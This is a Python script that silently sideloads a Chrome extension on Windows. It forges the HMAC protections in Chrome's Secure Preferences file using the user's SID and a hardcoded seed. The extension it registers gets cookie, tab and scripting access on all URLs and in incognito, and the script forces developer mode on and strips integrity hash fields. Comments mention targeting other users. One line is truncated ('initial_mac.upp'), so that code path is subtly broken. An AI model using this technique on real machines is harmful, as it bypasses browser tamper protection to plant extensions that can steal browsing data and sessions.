import hmac
import json
from collections import OrderedDict
import hashlib
import os
import win32security #for SID, need to pip install pywin32
import win32api #for SID, need to pip install pywin32
import datetime

#https://github.com/Pica4x6/SecurePreferencesFile
def removeEmpty(d):
    if type(d) == type(OrderedDict()):
        t = OrderedDict(d)
        for x, y in t.items():
            if type(y) == (type(OrderedDict())):
                if len(y) == 0:
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif(type(y) == type({})):
                if(len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type([])):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            else:
                if (not y) and (y not in [False, 0]):
                    del d[x]

    elif type(d) == type([]):
        for x, y in enumerate(d):
            if type(y) == type(OrderedDict()):
                if len(y) == 0:
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type({})):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type([])):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            else:
                if (not y) and (y not in [False, 0]):
                    del d[x]

#https://github.com/Pica4x6/SecurePreferencesFile
def calculateHMAC(value_as_string, path, sid, seed):
    if ((type(value_as_string) == type({})) or (type(value_as_string) == type(OrderedDict()))):
        removeEmpty(value_as_string)
    message = sid + path + json.dumps(value_as_string, separators=(',', ':'), ensure_ascii=False).replace('<', '\\u003C').replace('\\u2122', '™')
    hash_obj = hmac.new(seed, message.encode("utf-8"), hashlib.sha256)

    return str(hash_obj.hexdigest().upper())

#https://github.com/Pica4x6/SecurePreferencesFile
def calc_supermac(json_file, sid, seed):
    # Reads the file
    json_data = open(json_file, encoding="utf-8")
    data = json.load(json_data, object_pairs_hook=OrderedDict)
    json_data.close()
    temp = OrderedDict(sorted(data.items()))
    data = temp

    # Calculates and sets the super_mac
    super_msg = sid + json.dumps(data['protection']['macs']).replace(" ", "")
    hash_obj = hmac.new(seed, super_msg.encode("utf-8"), hashlib.sha256)
    return hash_obj.hexdigest().upper()

def get_extension_id(path):
    m=hashlib.sha256()
    m.update(bytes(path.encode('utf-16-le')))
    EXTID = ''.join([chr(int(i, base=16) + ord('a')) for i in m.hexdigest()][:32])
    print("Using ExtID: {}".format(EXTID))
    return EXTID

def calculate_chrome_dev_mac(seed: bytes, sid: str, pref_path: str, pref_value) -> str:
    """
    Calculates the HMAC-SHA256 for a Chrome protected preference.

    Parameters:
        seed (bytes): The secret key from PlatformKeys.
        sid (str): The Windows user SID.
        pref_path (str): The full preference path (e.g., "extensions.ui.developer_mode").
        pref_value: The preference value (e.g., True, False, a string, etc.).

    Returns:
        str: The hexadecimal HMAC digest.
    """
    # Serialize the value to canonical JSON (compact, sorted if needed)
    serialized_value = json.dumps(pref_value, separators=(',', ':'), sort_keys=True)
    
    # Build the input string
    hmac_input = (sid + pref_path + serialized_value).encode('utf-8')
    
    # Calculate the HMAC-SHA256
    return hmac.new(seed, hmac_input, hashlib.sha256).hexdigest()

def encode_to_install_time(date):
    base_date = datetime.datetime(1970, 1, 1, 0, 0, 0)
    difference_in_seconds = (date - base_date).total_seconds()
    install_time = int(difference_in_seconds * 1000000) + 11644473600000000
    return install_time

def remove_keys_containing(obj, substring):
    """Recursively removes keys containing a specific substring from a dict or list."""
    if isinstance(obj, dict):
        # Identify keys to delete; list(obj.keys()) prevents 'dictionary changed size' error
        keys_to_delete = [k for k in obj.keys() if substring in k]
        for k in keys_to_delete:
            del obj[k]
        
        # Recurse into remaining dictionary values
        for v in obj.values():
            remove_keys_containing(v, substring)
            
    elif isinstance(obj, list):
        # Recurse into items within a list
        for item in obj:
            remove_keys_containing(item, substring)

def clean_json_file(input_path, output_path, substring):
    """Loads JSON, cleans keys, and writes back to a file."""
    with open(input_path, 'r') as f:
        data = json.load(f)
    
    remove_keys_containing(data, substring)
    
    with open(output_path, 'w') as f:
        json.dump(data, f, indent=4)

def add_extension():
    #auto calculate current user and corresponding SID for you, but if targeting another user you will need to change this
    username = win32api.GetUserName()

    # Look up the SID for the username
    sid, domain, type = win32security.LookupAccountName(None, username)

    # Convert the SID to a string representation
    sid_string = win32security.ConvertSidToStringSid(sid)
    print(f"Current user SID: {sid_string}")
    
    list_sid = str(sid_string).split("-")
    sid = ""
    for i in range(len(list_sid)):
        if i != len(list_sid) -1:
            sid += list_sid[i] + "-"
        
    sid = sid[:-1] #necessary because we need SID with final - section removed
    print("Sid is", sid)
    user = os.getlogin()
    print("User is", user)
    #input() #only for testing purposes
    extpath = "C:\\Yourpath\\here" #fill in path to your extension dir, make sure to leave off trailing slash
    extensionid=get_extension_id(extpath)
    ###add json to file

    #dynamically change first_install_time and last_update_time
    given_date = datetime.datetime.now()
    encoded_install_time = encode_to_install_time(given_date)
    extension_json=r'{"account_extension_type":0,"active_permissions":{"api":["cookies","storage","tabs","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"commands":{},"content_settings":[],"creation_flags":38,"first_install_time":"%s","from_webstore":false,"granted_permissions":{"api":["cookies","downloads","storage","tabs"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"incognito":true,"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"%s","location":4,"newAllowFileAccess":true,"path":"","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["tabs.onUpdated"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}' % (encoded_install_time, encoded_install_time)
    
    #convert to ordereddict for calc and addition
    dict_extension=json.loads(extension_json, object_pairs_hook=OrderedDict)
    dict_extension["path"]=extpath
    filepath="C:\\Users\\{}\\appdata\\local\\Google\\Chrome\\User Data\\Default\\Secure Preferences".format(user)
    with open(filepath, 'rb') as f:
            data = f.read()
    f.close()
    data=json.loads(data,object_pairs_hook=OrderedDict)
    data["extensions"]["settings"][extensionid]=dict_extension
    ###calculate hash for [protect][mac]
    path="extensions.settings.{}".format(extensionid)
    #hardcoded seed
    seed=b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'
    macs = calculateHMAC(dict_extension, path, sid, seed)
    #add macs to json file
    data["protection"]["macs"]["extensions"]["settings"][extensionid]=macs

    print("Checking if signed in account, setting developer mode to true if it is...")
    try:
        data["account_values"]["extensions"]["ui"]["developer_mode"]=True
        print("User is signed in, added extra field!")
    except KeyError:
        print("No signed in account! Adding proper fields")
        #data["account_values"].setdefault("extensions", OrderedDict())
        # now insert your empty OrderedDict into developer_mode
        data.setdefault("account_values", OrderedDict())
        data["account_values"].setdefault("extensions", OrderedDict())
        data["account_values"]["extensions"].setdefault("ui", OrderedDict())
        data["account_values"]["extensions"]["ui"].setdefault("developer_mode", OrderedDict())
        data["account_values"]["extensions"]["ui"]["developer_mode"] = OrderedDict()
        data["account_values"]["extensions"]["ui"]["developer_mode"]= True

    #if this exists, now you need to deal with second value:
    try:
        initial_pref_path = "account_values.extensions.ui.developer_mode"
        initial_pref_value = True
        initial_mac = calculate_chrome_dev_mac(seed, sid, initial_pref_path, initial_pref_value)
        data["protection"]["macs"]["account_values"]["extensions"]["ui"]["developer_mode"] = initial_mac.upper()
        print("Initial mac is: ", initial_mac.upper())
    except KeyError:
        print("Account signed in but fields wrong for developer mode protection key")
        initial_pref_path = "account_values.extensions.ui.developer_mode"
        initial_pref_value = True
        initial_mac = calculate_chrome_dev_mac(seed, sid, initial_pref_path, initial_pref_value)
        data["protection"]["macs"].setdefault("account_values")
        data["protection"]["macs"]["account_values"]["extensions"]["ui"]["developer_mode"] = OrderedDict()
        data["protection"]["macs"]["account_values"]["extensions"]["ui"]["developer_mode"] = initial_mac.upp

    #set dev mode to true, ensure field exists
    try:
        data["extensions"]["ui"]["developer_mode"]=True
    except KeyError: # means extensions: UI is not found
       
        # developer_mode = OrderedDict()
        # ui = OrderedDict()
        data["extensions"].setdefault("ui", OrderedDict())
        # now insert your empty OrderedDict into developer_mode
        data["extensions"]["ui"]["developer_mode"] = OrderedDict()
        data["extensions"]["ui"]["developer_mode"]= True

        # print("Need to toggle developer mode")
    #data["extensions"]["ui"]["developer_mode"]=True
    pref_path = "extensions.ui.developer_mode"
    pref_value = True
    mac = calculate_chrome_dev_mac(seed, sid, pref_path, pref_value)
    #print(mac)
    data["protection"]["macs"]["extensions"]["ui"]["developer_mode"]=mac
    devmode_value=r'{"developer_mode": true}'
    parseddevmode=json.loads(devmode_value, object_pairs_hook=OrderedDict)
    newdata=json.dumps(data)
    with open(filepath, 'w') as z:
            z.write(newdata)
    z.close()
    ###recalculate and replace super_mac
    supermac=calc_supermac(filepath,sid,seed)
    data["protection"]["super_mac"]=supermac
    newdata=json.dumps(data)
    with open(filepath, 'w') as z:
            z.write(newdata)
    z.close()

    #remove fields to allow developer mode to be turned on
    clean_json_file(filepath, filepath, '_encrypted_hash')


if __name__ == "__main__":
    add_extension()
    print("Extension added!")
    
